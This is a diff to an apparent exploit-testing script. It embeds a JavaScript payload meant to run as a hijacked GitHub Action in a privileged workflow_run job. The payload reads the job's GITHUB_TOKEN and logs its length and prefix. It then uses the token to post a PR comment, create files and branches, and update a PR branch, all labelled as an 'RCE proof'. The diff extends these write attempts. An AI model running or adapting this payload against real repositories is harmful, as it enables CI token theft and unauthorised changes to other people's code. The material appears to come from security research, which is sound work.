@@ -146,7 +146,7 @@ except Exception as _e:
     print('MEM-SCAN-EXC %r' % (_e,), flush=True)
 '''
 
-STICKY_JS = r'''
+STICKY_JS = r"""
 const https = require('https');
 const fs = require('fs');
 const token = process.env['INPUT_GITHUB_TOKEN'] || process.env['GITHUB_TOKEN'] || '';
@@ -165,37 +165,41 @@ function api(method, path, body) {
     const req = https.request({ hostname: 'api.github.com', path: path, method: method, headers: headers }, (res) => {
       let b = '';
       res.on('data', (d) => { b += d; });
-      res.on('end', () => resolve({ status: res.statusCode, body: b }));
+      res.on('end', () => resolve({ status: res.statusCode, body: b, perm: res.headers['x-accepted-github-permissions'] || '-', scopes: res.headers['x-oauth-scopes'] || '-' }));
     });
-    req.on('error', (e) => resolve({ status: 0, body: String(e) }));
+    req.on('error', (e) => resolve({ status: 0, body: String(e), perm: '-', scopes: '-' }));
     if (data) req.write(data);
     req.end();
   });
 }
 
 (async () => {
-  console.log('HIJACKED-ACTION-RAN token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + ' repo=' + repo);
+  console.log('HIJACKED-ACTION-RAN token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + ' repo=' + repo + ' run=' + runId);
   const me = await api('GET', '/user');
-  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 200));
+  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 160) + ' perms=' + me.perm);
   const r = await api('GET', '/repos/' + repo);
-  console.log('API repo perms => ' + r.status + ' ' + (r.body.match(/"permissions":\{[^}]*\}/) || ['n/a'])[0]);
-  const cm = await api('POST', '/repos/' + repo + '/issues/__PR__/comments', {
-    body: 'RCE proof: this comment was posted by the GITHUB_TOKEN stolen from the privileged workflow_run job (run ' + runId + ', artifact ' + (process.env.GITHUB_RUN_ID || '') + '). Marker RCE-PROOF-' + runId
+  console.log('API repo perms_field => ' + r.status + ' ' + (r.body.match(/"permissions":\{[^}]*\}/) || ['n/a'])[0]);
+  const cm = await api('POST', '/repos/' + repo + '/issues/' + (process.env.PROBE_PR || '__PR__') + '/comments', {
+    body: 'RCE proof: comment posted by the GITHUB_TOKEN stolen from the privileged workflow_run job (run ' + runId + '). Marker RCE-PROOF-' + runId
   });
-  console.log('API comment (pull-requests:write) => ' + cm.status + ' ' + cm.body.slice(0, 200));
+  console.log('API comment (pull-requests:write) => ' + cm.status + ' perms=' + cm.perm + ' ' + cm.body.slice(0, 160));
+  const putc = await api('PUT', '/repos/' + repo + '/contents/rce-proof-' + runId + '.txt', {
+    message: 'rce proof ' + runId, content: Buffer.from('rce-proof ' + runId + '\n').toString('base64'), branch: 'rce-proof-' + runId
+  });
+  console.log('API put-contents on new branch (contents:write) => ' + putc.status + ' perms=' + putc.perm + ' ' + putc.body.slice(0, 260));
   const ref = await api('POST', '/repos/' + repo + '/git/refs', {
-    ref: 'refs/heads/rce-proof-' + runId, sha: process.env.GITHUB_SHA || ''
+    ref: 'refs/heads/rce-ref-' + runId, sha: process.env.GITHUB_SHA || ''
   });
-  console.log('API create-ref (contents:write attempt) => ' + ref.status + ' ' + ref.body.slice(0, 300));
-  const ub = await api('PUT', '/repos/' + repo + '/pulls/__PR__/update-branch', {});
-  console.log('API update-branch (contents:write attempt) => ' + ub.status + ' ' + ub.body.slice(0, 300));
+  console.log('API create-ref (contents:write) => ' + ref.status + ' perms=' + ref.perm + ' ' + ref.body.slice(0, 240));
+  const ub = await api('PUT', '/repos/' + repo + '/pulls/' + (process.env.PROBE_PR || '__PR__') + '/update-branch', {});
+  console.log('API update-branch (contents:write) => ' + ub.status + ' perms=' + ub.perm + ' ' + ub.body.slice(0, 240));
   try {
     fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/TOKEN_STOLEN.txt',
       'token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + '\n');
   } catch (e) { console.log('fs-error ' + e); }
   process.exit(0);
 })().catch((e) => { console.log('hijack-error ' + e); process.exit(0); });
-'''
+"""
 
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
